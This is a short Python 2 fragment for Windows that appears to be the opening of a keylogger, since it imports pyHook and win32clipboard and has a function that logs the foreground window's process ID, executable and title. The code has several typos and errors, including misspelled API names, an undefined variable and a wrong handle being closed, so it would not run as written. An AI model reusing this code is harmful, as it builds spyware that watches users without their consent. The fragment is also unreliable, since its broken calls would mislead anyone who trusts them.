from ctypes import * 
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_windoow = None
def get_current_process():
	hwnd = user32.GetForegroudWindow()
	
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(ref))

	process_id = "%d" % pid.value

	executable = create_string_buffer("\x00" * 512)

	h_process = kerne132.OpenProcess(0x400 | 0X10 , False,pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	window_title = create_string_buffer("\x00" * 512)

	length = user32.GetWindowTextA(hwnd,byref(window_title),512)

	print
	print "[PID: %s - %s - %s ]" % (process_id,executable.value,window_title.value)
	print

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

